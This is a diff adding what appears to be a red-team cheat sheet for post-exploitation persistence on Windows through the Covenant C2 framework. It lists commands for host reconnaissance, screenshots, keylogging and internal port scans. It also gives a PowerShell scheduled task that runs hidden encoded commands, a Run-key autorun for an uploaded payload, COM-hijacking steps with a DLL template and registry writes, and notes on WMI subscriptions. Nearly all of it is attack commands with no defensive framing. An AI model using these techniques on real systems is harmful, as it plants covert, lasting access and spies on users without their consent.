@@ -1,0 +1,124 @@
+ Seatbelt -group=system
+ Screenshot
+ Keylogger 30
+ PortScan fs-1,dc-1 135,445,3389,4444,5985 
+ 
+#PERSISTENCE
+ PersistStartup
+ C:\Users\j.hunt\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+ ----------------
+#Scheduled Task
+ PowerShellImport
+ function New-ScheduledTaskPersistence {
+
+    $name = "Persistence"
+  
+    $trigger = New-ScheduledTaskTrigger `
+        -Once `
+        -At 11am `
+        -RepetitionInterval (New-TimeSpan -Hours 4) `
+        -RepetitionDuration (New-TimeSpan -Days 30)
+  
+      $action = New-ScheduledTaskAction `
+        -Execute "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" `
+        -Argument "-Sta -Nop -Window Hidden -EncodedCommand " `
+        -WorkingDirectory "C:\Windows\System32"
+  
+      Register-ScheduledTask `
+        -TaskName $name `
+        -Trigger $trigger `
+        -Action $action `
+        -Force
+}
+ 
+ PowerShell Get-ScheduledTask -TaskName Persistence
+ -----------------------------------------
+#Registry Autoruns
+ 
+  PersistAutorun
+  Upload .exe form Covenant
+  C:\Users\users\AppData\Local\Temp\payload.exe
+  GetRegistryKey HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+  
+#COM Hijacking
+ HKEY_CLASSES_ROOT\CLSID and HKEY_CLASSES_ROOT\Interface
+ HKEY_CURRENT_USER\Software\Classes
+ 
+ #Hunting COM Hijacks
+Run ProcessMonitor Procmon - Sysinternals Suite
+RegOpenKey operations
+where the Result is NAME NOT FOUND
+and the Path ends with InprocServer32
+DLL_PROCESS_ATTACH 
+1-Complie DLL
+#include "stdafx.h"
+
+BOOL APIENTRY DllMain( HMODULE hModule,
+                       DWORD  ul_reason_for_call,
+                       LPVOID lpReserved
+					 )
+{
+	switch (ul_reason_for_call)
+	{
+	case DLL_PROCESS_ATTACH:
+	case DLL_THREAD_ATTACH:
+	case DLL_THREAD_DETACH:
+	case DLL_PROCESS_DETACH:
+		break;
+	}
+	return TRUE;
+}
+2- Select CLSID
+3 - Make DLL
+New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{clsid}"
+New-Item -Path "HKCU:Software\Classes\CLSID\{clsid}" -Name "InprocServer32" -Value "C:\Users\Rasta\Desktop\COMTest.dll"
+New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{clsid}\InprocServer32" -Name "ThreadingModel" -Value "Both"
+
+FIND COM WITH TASK SCHELUDER WITH THIS SCRIPT
+$Tasks = Get-ScheduledTask
+
+foreach ($Task in $Tasks)
+{
+    if ($Task.Actions.ClassId -ne $null)
+    {
+        if ($Task.Triggers.Enabled -eq $true)
+        {
+            if ($Task.Principal.GroupId -eq "Users")
+            {
+                Write-Host "Task Name: " $Task.TaskName
+                Write-Host "Task Path: " $Task.TaskPath
+                Write-Host "CLSID: " $Task.Actions.ClassId
+                Write-Host
+            }
+        }
+    }
+}
+
+Get-Item -Path "Registry::HKCR\CLSID\{2DEA658F-54C1-4227-AF9B-260AB5FC3543}" | ft -AutoSize
+Get-ChildItem -Path "Registry::HKCR\CLSID\{2DEA658F-54C1-4227-AF9B-260AB5FC3543}" | ft -AutoSize
+
+#WMI Subscriptions
+ PersistWMI
+ You have to be local admin
+ Infect ProcessName such notepad
+ Other alternative:
+ https://github.com/Sw4mpf0x/PowerLurk
+  
+
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
